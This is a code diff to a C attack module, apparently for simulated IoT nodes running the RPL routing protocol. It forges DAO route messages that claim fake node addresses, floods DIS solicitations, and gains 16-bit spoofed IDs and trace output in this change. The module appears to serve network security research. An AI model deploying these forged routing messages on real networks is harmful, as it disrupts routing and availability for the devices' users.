@@ -6,6 +6,9 @@
 #include "lib/random.h"
 #include "attack.h"
 #include <string.h>
+#ifdef ATTACK_TRACE
+#include <stdio.h>
+#endif
 
 #ifndef ATTACK_START_SEC
 #define ATTACK_START_SEC 300
@@ -17,7 +20,9 @@
 #define ATTACK_DAO_INTERVAL 2
 #endif
 #ifndef NUM_NODES
+#ifndef NUM_NODES
 #define NUM_NODES 30
+#endif
 #endif
 
 uint32_t attack_dis_sent;
@@ -31,7 +36,10 @@ forged_dao(void)
   unsigned char *b = UIP_ICMP_PAYLOAD;
   const uip_ipaddr_t *me = rpl_get_global_address();
   uip_ipaddr_t *real;
-  uint8_t fake;
+  uint16_t real_id;
+  uint16_t fake;
+  uint8_t hi;
+  uint8_t lo;
   int pos = 0;
 
   if(!curr_instance.used || curr_instance.dag.preferred_parent == NULL ||
@@ -42,9 +50,12 @@ forged_dao(void)
   if(real == NULL) {
     return;
   }
+  real_id = ((uint16_t)real->u8[14] << 8) | real->u8[15];
   do {
     fake = 1 + random_rand() % NUM_NODES;
-  } while(fake == node_id || fake == real->u8[15]);
+  } while(fake == node_id || fake == real_id);
+  hi = fake >> 8;
+  lo = fake & 0xff;
 
   b[pos++] = curr_instance.instance_id;
   b[pos++] = 0;
@@ -66,17 +77,20 @@ forged_dao(void)
   b[pos++] = curr_instance.default_lifetime;
   memcpy(b + pos, &curr_instance.dag.dag_id, 8);
   pos += 8;
-  b[pos++] = 0x02;
-  b[pos++] = fake;
-  b[pos++] = 0;
-  b[pos++] = fake;
-  b[pos++] = 0;
-  b[pos++] = fake;
-  b[pos++] = 0;
-  b[pos++] = fake;
+  b[pos++] = hi ^ 0x02;
+  b[pos++] = lo;
+  b[pos++] = hi;
+  b[pos++] = lo;
+  b[pos++] = hi;
+  b[pos++] = lo;
+  b[pos++] = hi;
+  b[pos++] = lo;
 
   uip_icmp6_send(&curr_instance.dag.dag_id, ICMP6_RPL, RPL_CODE_DAO, pos);
   attack_dao_sent++;
+#ifdef ATTACK_TRACE
+  printf("#A 2\n");
+#endif
 }
 
 PROCESS_THREAD(attack_process, ev, data)
@@ -102,6 +116,9 @@ PROCESS_THREAD(attack_process, ev, data)
     if((ATTACK_MODE & ATK_DIS) && data == &dis_timer) {
       rpl_icmp6_dis_output(NULL);
       attack_dis_sent++;
+#ifdef ATTACK_TRACE
+      printf("#A 1\n");
+#endif
       etimer_reset(&dis_timer);
     }
     if((ATTACK_MODE & ATK_DAO) && data == &dao_timer) {
